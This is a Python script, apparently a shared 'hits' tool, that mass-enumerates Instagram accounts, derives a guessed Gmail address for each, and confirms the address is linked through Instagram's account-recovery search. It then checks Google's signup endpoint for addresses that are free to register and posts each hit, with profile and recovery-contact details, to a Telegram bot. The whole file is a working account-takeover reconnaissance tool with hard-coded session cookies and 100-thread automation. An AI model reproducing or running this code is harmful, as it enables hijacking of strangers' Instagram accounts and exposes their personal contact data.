import requests
import random
import json
import string
import re
import os
import sys
import uuid
import time
import secrets
import base64
from datetime import datetime
from threading import Thread
from concurrent.futures import ThreadPoolExecutor, as_completed
from cfonts import render
import httpx

goodig = 0
badig = 0
taken = 0
hits = 0
email = None
info = {}
sess = requests.session()
session = requests.session()

# Color definitions
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
RESET = "\033[0m"
BOLD = "\033[1m"
Y = "\033[1;33m"
W = "\033[1;37m"
LG = "\x1b[38;5;120m"
ORANGE = "\033[1m\033[38;5;208m"

# Colors class for dih() function
class Colors:
    CYAN = CYAN
    GREEN = GREEN
    BLUE = BLUE
    RESET = RESET

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def center(txt):
    width = 80
    return txt.center(width)

clear()

# Display banner
AthexPy = render('AX X', colors=['white', 'red'], align='center')
AthexPy2 = render('SVRCORN', colors=['white', 'red'], align='center')

print("—" * 60)
print(AthexPy)
print(AthexPy2)
print("—" * 60)
print(f"\033[91m   ✦ 𝐓ᴏᴏʟ 𝐁ʏ ➜ @athexogu | @c0dewithamn ✦  {RESET}")
print("—" * 60)

token = input(f"\033[96m  • 𝐓ᴏᴋᴇɴ  ➜  \033[1m\033[32m")
id = input(f"\033[96m  • 𝐈𝐃  ➜  \033[1m\033[32m")

def dih():
    os.system("clear")
    print(f"""  
╔════════════════════════════════════╗
║                                      ║
║   {Colors.CYAN}  🎯 𝗛𝗜𝗧𝗦  {Colors.RESET}     ➜  {Colors.GREEN}  {hits}  {Colors.RESET}              ║
║   {Colors.CYAN}  ✅ 𝗚𝗢𝗢𝗗  {Colors.RESET}    ➜  {Colors.GREEN}  {goodig}  {Colors.RESET}             ║
║   {Colors.CYAN}  📦 𝗧𝗔𝗞𝗘𝗡  {Colors.RESET}   ➜  {Colors.GREEN}  {taken}  {Colors.RESET}              ║
║   {Colors.CYAN}  ❌ 𝗕𝗔𝗗  {Colors.RESET}     ➜  {Colors.GREEN}  {badig}  {Colors.RESET}              ║
║   {Colors.CYAN}  📧 𝗘𝗠𝗔𝗜𝗟  {Colors.RESET}   ➜  {Colors.GREEN}  {email if email else 'None'}  {Colors.RESET}              ║
║                                      ║
║   {Colors.BLUE}  🔧 Tool by  ➜  @c0dewithamn  {Colors.RESET}        ║
║   {Colors.BLUE}  👑 Made by  ➜  @AthexPy  {Colors.RESET}            ║
║                                      ║
╚════════════════════════════════════╝  """)

def save():
    while True:
        try:
            headers = {
                'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
                'x-ig-app-id': "936619743392459",
            }
            response = session.get('https://www.instagram.com/', headers=headers, timeout=20)
            csrf = response.cookies.get('csrftoken', '')
            find = re.search(r'"LSD",\[\],\{"token":"(.*?)"\}', response.text)
            lsd = find.group(1) if find else None
            with open("tk.txt", "w") as fd:
            	fd.write(f"{csrf}|{lsd}")
        except:
            pass
Thread(target=save, daemon=True).start()

def load():
    try:
        with open('tk.txt', 'r') as file:
            parts = file.read().strip().split("|")
            if len(parts) == 2:
                csrf, lsd = parts
                if csrf and lsd:
                    return csrf, lsd
    except Exception:
        pass
    return "iOtJRFIg4a1qWbmj6kyFAnl9myM1KL4N", "gBe1PvkGrT-aR_CQpsVxFN"
    
def tl():
	while True:
		url = "https://accounts.google.com/_/signup/validatepersonaldetails"
		params = {
		  'hl': "en-GB",
		  '_reqid': "53783",
		  'rt': "j"
		}	
		payload = {
		  'continue': "https://accounts.google.com/ManageAccount?nc=1",
		  'f.req': "[\"AEThLlyqgqLPV0f6HzRoGLshUJg6mbndQGB9GdyTm4_7N0rkw5xyF2XNXv2T_Z__Y3J6wSpmG6pf\",null,null,null,null,0,0,\"aesowns\",\"aesowns\",null,0,null,1,[],1]",
		  'azt': "AFoagUXLy6Rp_0r9ndY4VoF-_JqFZfUA5g:1777195569838",
		  'cookiesDisabled': "false",
		  'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
		  'gmscoreversion': "null",
		  'flowName': "GlifWebSignIn",
		  'checkConnection': "youtube:506",
		  'checkedDomains': "youtube",
		  'pstMsg': "1",
		  '': ""
		}	
		headers = {
		  'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
		  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
		  'x-same-domain': "1",
		  'sec-ch-ua-mobile': "?0",
		  'sec-ch-ua-arch': "\"x86\"",
		  'sec-ch-ua-full-version': "\"139.0.7339.0\"",
		  'sec-ch-ua-platform-version': "\"\"",
		  'google-accounts-xsrf': "1",
		  'sec-ch-ua-full-version-list': "\"Chromium\";v=\"139.0.7339.0\", \"Not;A=Brand\";v=\"99.0.0.0\"",
		  'sec-ch-ua-bitness': "\"64\"",
		  'sec-ch-ua-model': "\"\"",
		  'sec-ch-ua-wow64': "?0",
		  'sec-ch-ua-platform': "\"Linux\"",
		  'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
		  'origin': "https://accounts.google.com",
		  'x-client-data': "CP/xygE=",
		  'sec-fetch-site': "same-origin",
		  'sec-fetch-mode': "cors",
		  'sec-fetch-dest': "empty",
		  'referer': "https://accounts.google.com/createaccount?flowName=GlifWebSignIn&flowEntry=ServiceLogin",
		  'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
		  'Cookie': "__Host-GAPS=1:EhbstgKlDk0uMAp9ixBTbPrcCGqE0w:zIF14iIQ24jrNM9C"
		}
		response = sess.post(url, params=params, data=payload, headers=headers)
		tl = json.loads(response.text[5:])[0][1][2]
		url = "https://accounts.google.com/_/signup/validatebasicinfo"
		params = {
		  'hl': "en-GB",
		  'TL': tl,
		  '_reqid': "253783",
		  'rt': "j"
		}
		payload = {
		  'continue': "https://accounts.google.com/ManageAccount?nc=1",
		  'f.req': "[\"TL:"+ tl +"\",2015,4,15,2,null,null,0,null,null,0,0]",
		  'azt': "AFoagUXLy6Rp_0r9ndY4VoF-_JqFZfUA5g:1777195569838",
		  'cookiesDisabled': "false",
		  'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
		  'gmscoreversion': "null",
		  'flowName': "GlifWebSignIn",
		  'checkConnection': "youtube:506",
		  'checkedDomains': "youtube",
		  'pstMsg': "1",
		  '': ""
		}
		headers = {
		  'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
		  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
		  'x-same-domain': "1",
		  'sec-ch-ua-mobile': "?0",
		  'sec-ch-ua-arch': "\"x86\"",
		  'sec-ch-ua-full-version': "\"139.0.7339.0\"",
		  'sec-ch-ua-platform-version': "\"\"",
		  'google-accounts-xsrf': "1",
		  'sec-ch-ua-full-version-list': "\"Chromium\";v=\"139.0.7339.0\", \"Not;A=Brand\";v=\"99.0.0.0\"",
		  'sec-ch-ua-bitness': "\"64\"",
		  'sec-ch-ua-model': "\"\"",
		  'sec-ch-ua-wow64': "?0",
		  'sec-ch-ua-platform': "\"Linux\"",
		  'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
		  'origin': "https://accounts.google.com",
		  'x-client-data': "CP/xygE=",
		  'sec-fetch-site': "same-origin",
		  'sec-fetch-mode': "cors",
		  'sec-fetch-dest': "empty",
		  'referer': "https://accounts.google.com/signup/v2/birthdaygender?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL="+ tl,
		  'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
		  'Cookie': "__Host-GAPS=1:EhbstgKlDk0uMAp9ixBTbPrcCGqE0w:zIF14iIQ24jrNM9C"
		}
		response = sess.post(url, params=params, data=payload, headers=headers, timeout=20)
		tl = json.loads(response.text[5:])[0][0][4].split("TL:")[1]
		with open("tl.txt", "w") as t:
			t.write(tl)
Thread(target=tl, daemon=True).start()

def cxqok(query):
	url = "https://www.instagram.com/api/graphql"
	payload = {
	  'av': "0",
	  'hl': "en",
	  '__d': "www",
	  '__user': "0",
	  '__a': "1",
	  '__req': "m",
	  '__hs': "20569.HYP:instagram_web_pkg.2.1...0",
	  'dpr': "3",
	  '__ccg': "GOOD",
	  '__rev': "1038168287",
	  '__s': "ubeolm:oo2y6g:7a3dbg",
	  '__hsi': "7633008931340678946",
	  '__dyn': "7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awt81s8hwnU6a3a1YwBgao6C1uwoE2swlo5q4U2zxe2GewGw9a361qw8Xwn8e87q0oa2-azo7u3u2C2O0Lo6-3u2WE5B0bK1Iwqo5p0qZ6goK10xKi2K7E5y2-1mwa6byohw5ywuU1FU",
	  '__csr': "gxll58Ds4y115T9ikl4RYCQGbqkxBcBssmGAV2yDqA-R-mGPpJy2OlKStTtfjJ8DrCFamLuGijTVeCjBKGFkpkJfy-IgAuh2WVyHW_BQR8X99p_v9VuGBxbHA8qlaA4qQq222d4KE-dChubV4-p0goSRx2nCBBDGbzEaUG6kiHzUhCDz8OcyQfyE-bUuxei2e222a78Pxqewzw05xRAzoS09Dxro1sU1_aU0Wt0rOw9Zw7zwa-023y3d3UpeEx2VU1bQ0bLa0TS0qq1n81twwyixycN0owlkfwNUjxokcyEa84tw1km0ZUjw1y200zAE",
	  '__hsdp': "n1sg2c1aAAt2rjy2puuIIAvl8AgAu58lBxaA540To4C2O17UkgbibgBxaf74xAUS46Eb308N0de07SE0nfw6IU0BK1bw16C0uS",
	  '__hblp': "05TxaA583uwioa84S1MwYwkEK7UG2q48ao2fwGx29Bwaui0g61ew6ywIwiF80WO0JKEB0aS0sq1by80zW9w9G9wpo32w2cE4K0h-0le0i61IwpEnwvFEnw4Tw9Kaw",
	  '__sjsp': "n1sg2c1aAAt2rjy2puuIIAAll8DcAu58rxaA0YU4C2O17UkgbibgBxaf74xAUS46Eb308N0",
	  '__comet_req': "7",
	  'lsd': "AdRYk-8jH_A4CtN1mXqgFLodQ1c",
	  'jazoest': "22243",
	  '__spin_r': "1038168287",
	  '__spin_b': "trunk",
	  '__spin_t': "1777198382",
	  '__crn': "comet.igweb.PolarisCAAIGAccountRecoverySearchRoute",
	  'qpl_active_flow_ids': "516759801",
	  'fb_api_caller_class': "RelayModern",
	  'fb_api_req_friendly_name': "CAAIGAccountSearchViewQuery",
	  'server_timestamps': "true",
	  'variables': "{\"params\":{\"event_request_id\":\"fa111c9d-e5f2-426c-bf96-382b70b75f14\",\"next_uri\":\"\",\"search_query\":\""+ query +"\",\"waterfall_id\":\"f64321a1-2973-45cd-b24e-97651e3cde42\"}}",
	  'doc_id': "26178667145161478",
	  'fb_api_analytics_tags': "[\"qpl_active_flow_ids=516759801\"]"
	}
	headers = {
	  'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'sec-ch-ua-model': "\"\"",
	  'x-ig-app-id': "936619743392459",
	  'x-ig-max-touch-points': "5",
	  'sec-ch-ua-mobile': "?0",
	  'x-fb-friendly-name': "CAAIGAccountSearchViewQuery",
	  'x-fb-lsd': "AdRYk-8jH_A4CtN1mXqgFLodQ1c",
	  'sec-ch-ua-platform-version': "\"\"",
	  'x-asbd-id': "359341",
	  'sec-ch-ua-full-version-list': "\"Chromium\";v=\"139.0.7339.0\", \"Not;A=Brand\";v=\"99.0.0.0\"",
	  'sec-ch-prefers-color-scheme': "dark",
	  'x-csrftoken': "df6wmdDC64l94XUJzVcDcSNggq9ok77f",
	  'sec-ch-ua-platform': "\"Linux\"",
	  'origin': "https://www.instagram.com",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://www.instagram.com/accounts/password/reset/?hl=en",
	  'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
	  'Cookie': "datr=YMnlaTJAraHY5ADdYH8UqsTG; ig_did=2046A480-DF50-4660-A5CD-DC58F57C7A1C; mid=aeXJYAABAAGoDWzGwrGALDqzE3Np; ps_l=1; ps_n=1; csrftoken=df6wmdDC64l94XUJzVcDcSNggq9ok77f; dpr=3.558248996734619; wd=774x1471"
	}
	response = requests.post(url, data=payload, headers=headers)
	email = next((i["contact_point"] for i in response.json() ["data"]["caa_ar_ig_account_search"]["contact_points"] if i["type"] == "EMAIL"), None)
	if email:
		return email
	else:
		return None
		
def bot(token, id, gmail, user, email):
		username = user
		data = info.get(username, {})
		business = data.get('is_business', None)
		followers = data.get('follower_count', None)
		followings = data.get('following_count', None)
		posts = data.get('media_count', None) or 0
		private = data.get('is_private', None)
		name = data.get('full_name', None)
		biography = data.get('biography', None)
		business = business if business is not None else 'None'
		followers = followers if followers is not None else 'None'
		followings = followings if followings is not None else 'None'
		private = private if private is not None else 'None'
		name = name if name is not None else 'None'
		biography = biography if biography is not None else 'None'
		if gmail:
			mail = gmail
		else:
			mail = 'None'
		if posts > 2:
			meta = 'True'
		else:
			meta = 'False'
		try:
			content = f"""
╔══════════════════════╗
         AX 🤝🏻 SVRCORN TOOL
╠══════════════════════╣
  𝐁ᴜsɪɴᴇss ➜ {business}
  𝐌ᴇᴛᴀ ➜ {meta}
  𝐍ᴀᴍᴇ ➜ {name}
  𝐔sᴇʀɴᴀᴍᴇ ➜ @{username}
  𝐅ᴏʟʟᴏᴡᴇʀs ➜ {followers}
  𝐅ᴏʟʟᴏᴡɪɴɢ ➜ {followings}
  𝐏ᴏsᴛs ➜ {posts}
  𝐁ɪᴏ ➜ {biography}
  𝐆ᴍᴀɪʟ ➜ {email}
  𝐀ᴛᴛᴀᴄʜᴇᴅ 𝐌ᴀɪʟ ➜ {mail}
  𝐔ʀʟ ➜ https://www.instagram.com/{username}

╔══════════════════════╗  
  𝐓ᴏᴏʟ ➜ @oguport | @c0dewithamn
╚══════════════════════╝
"""
			response = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={content}", timeout=20)
		except:
			with open('HitsZ.txt', 'a') as a:
				a.write(f'{content}\n')
    
def lookup(email):
	global goodig, badig
	url = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
	device = str(uuid.uuid4())
	family = str(uuid.uuid4())
	android = "android-" + secrets.token_hex(8)
	payload = {
	  'params': "{\"client_input_params\":{\"aac\":\"{\\\"aac_init_timestamp\\\":"+ str(int(time.time())) +",\\\"aacjid\\\":\\\""+ str(uuid.uuid4()) +"\\\",\\\"aaccs\\\":\\\""+ secrets.token_urlsafe(32) +"\\\"}\",\"flash_call_permissions_status\":{\"READ_PHONE_STATE\":\"PERMANENTLY_DENIED\",\"READ_CALL_LOG\":\"DENIED\",\"ANSWER_PHONE_CALLS\":\"DENIED\"},\"was_headers_prefill_available\":0,\"network_bssid\":null,\"sfdid\":\"\",\"fetched_email_token_list\":{},\"search_query\":\""+ email +"\",\"auth_secure_device_id\":\"\",\"ig_oauth_token\":[],\"cloud_trust_token\":null,\"was_headers_prefill_used\":0,\"sso_accounts_auth_data\":[],\"encrypted_msisdn\":\"\",\"device_network_info\":null,\"text_input_id\":\"akyuf0:61\",\"zero_balance_state\":null,\"android_build_type\":\"release\",\"accounts_list\":[],\"is_oauth_without_permission\":0,\"ig_android_qe_device_id\":\""+ device +"\",\"gms_incoming_call_retriever_eligibility\":\"client_not_supported\",\"search_screen_type\":\"email_or_username\",\"is_whatsapp_installed\":1,\"lois_settings\":{\"lois_token\":\"\"},\"ig_vetted_device_nonce\":null,\"headers_infra_flow_id\":\"\",\"fetched_email_list\":[]},\"server_params\":{\"event_request_id\":\""+ str(uuid.uuid4()) +"\",\"is_from_logged_out\":0,\"layered_homepage_experiment_group\":null,\"device_id\":\""+ android +"\",\"login_surface\":\"login_home\",\"waterfall_id\":\""+ str(uuid.uuid4()) +"\",\"INTERNAL__latency_qpl_instance_id\":6.3987980400102E13,\"is_platform_login\":0,\"context_data\":\"\",\"login_entry_point\":\"logged_out\",\"INTERNAL__latency_qpl_marker_id\":36707139,\"family_device_id\":\""+ family +"\",\"offline_experiment_group\":\"caa_iteration_v3_perf_ig_4\",\"access_flow_version\":\"pre_mt_behavior\",\"is_from_logged_in_switcher\":0,\"qe_device_id\":\""+ device +"\"}}",
	  'bk_client_context': "{\"bloks_version\":\"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b\",\"styles_id\":\"instagram\"}",
	  'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
	}
	headers = {
	  'User-Agent': "Instagram 370.1.0.43.96 Android (34/14; 450dpi; 1080x2207; samsung; SM-A235F; a23; qcom; en_IN; 704872281)",
	  'accept-language': "en-IN, en-US",
	  'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
	  'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
	  'x-ig-android-id': android,
	  'x-ig-app-id': "567067343352427",
	  'x-ig-app-locale': "en_IN",
	  'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
	  'x-ig-device-id': device,
	  'x-ig-family-device-id': family,
	  'x-ig-timezone-offset': str(datetime.now().astimezone().utcoffset().total_seconds()),
	  'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
	  'x-pigeon-rawclienttime': str(time.time()),
	  'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
	}
	response = requests.post(url, data=payload, headers=headers, timeout=20)
	resp = response.text
#	print(resp)
	if f'{email}' in resp:
	   goodig+=1
	   dih()
	   check(email)
	else:
	   badig+=1
	   dih()
	   
def check(email):
	global hits, taken
	user = email.split("@")[0]
	with open("tl.txt", "r") as t:
		tl = t.read().strip()
	url = "https://accounts.google.com/_/signup/usernameavailability"
	params = {
	  'hl': "en-GB",
	  'TL': tl,
	  '_reqid': "353783",
	  'rt': "j"
	}
	payload = {
	  'continue': "https://accounts.google.com/ManageAccount?nc=1",
	  'f.req': "[\"TL:"+ tl +"\",\""+ user +"\",0,0,1,null,1,5021]",
	  'azt': "AFoagUXLy6Rp_0r9ndY4VoF-_JqFZfUA5g:1777195569838",
	  'cookiesDisabled': "false",
	  'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
	  'gmscoreversion': "null",
	  'flowName': "GlifWebSignIn",
	  'checkConnection': "youtube:506",
	  'checkedDomains': "youtube",
	  'pstMsg': "1",
	  '': ""
	}
	headers = {
	  'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'x-same-domain': "1",
	  'sec-ch-ua-mobile': "?0",
	  'sec-ch-ua-arch': "\"x86\"",
	  'sec-ch-ua-full-version': "\"139.0.7339.0\"",
	  'sec-ch-ua-platform-version': "\"\"",
	  'google-accounts-xsrf': "1",
	  'sec-ch-ua-full-version-list': "\"Chromium\";v=\"139.0.7339.0\", \"Not;A=Brand\";v=\"99.0.0.0\"",
	  'sec-ch-ua-bitness': "\"64\"",
	  'sec-ch-ua-model': "\"\"",
	  'sec-ch-ua-wow64': "?0",
	  'sec-ch-ua-platform': "\"Linux\"",
	  'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
	  'origin': "https://accounts.google.com",
	  'x-client-data': "CP/xygE=",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://accounts.google.com/signup/v2/createusername?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL="+ tl,
	  'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
	  'Cookie': "__Host-GAPS=1:EhbstgKlDk0uMAp9ixBTbPrcCGqE0w:zIF14iIQ24jrNM9C"
	}
	response = sess.post(url, params=params, data=payload, headers=headers, timeout=20)
	if '"gf.uar",1' in response.text:
		hits+=1
		dih()
		gmail = cxqok(user)
		bot(token, id, gmail, user, email)
	else:
		taken+=1
		dih()
    
def users():
    global email
    while True:
        csrf, lsd = load()
        cookies = {
            'rur': '"HIL\\05434063077956\\0541808701981:01fe820fc1c2330f586d4e12b336401bf6cfb504a4e47d3f81bd4fc6ac2b85cdb7e25b9f"'
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            'Content-Type': 'application/x-www-form-urlencoded',
            'x-bloks-version-id': "ad0f1f5e41c2d9fcde83dfd68eea4def768b66bc3029c58e846d7c1dda44ba2a",
            'x-ig-app-id': '936619743392459',
            'x-fb-lsd': lsd,
            'sec-ch-prefers-color-scheme': 'light',
            'x-csrftoken': csrf,
            'sec-ch-ua-platform': '"Android"',
            'origin': 'https://www.instagram.com',
            'sec-fetch-site': 'same-origin'
        }
        payload = {
            'lsd': lsd,
            'variables': json.dumps({"userID": random.randint(2500000000, 21254029834), "username": "cristiano"}),
            'doc_id': '7717269488336001',
        }
        response = session.post('https://www.instagram.com/api/graphql', headers=headers, data=payload, cookies=cookies, timeout=20)
        try:
            username = response.json().get('data', {}).get('user', {}).get('username', {})
            followers = response.json().get('data', {}).get('user', {}).get('follower_count', {})
            id = response.json().get('data', {}).get('user', {}).get('pk', {})
            if username and id and followers and followers > 20:
                info[username] = response.json().get('data', {}).get('user', {})
                email = username + '@gmail.com'
                lookup(email)
        except:
            pass
with ThreadPoolExecutor(max_workers=100) as executor:
    for _ in range(200):
        executor.submit(users)
        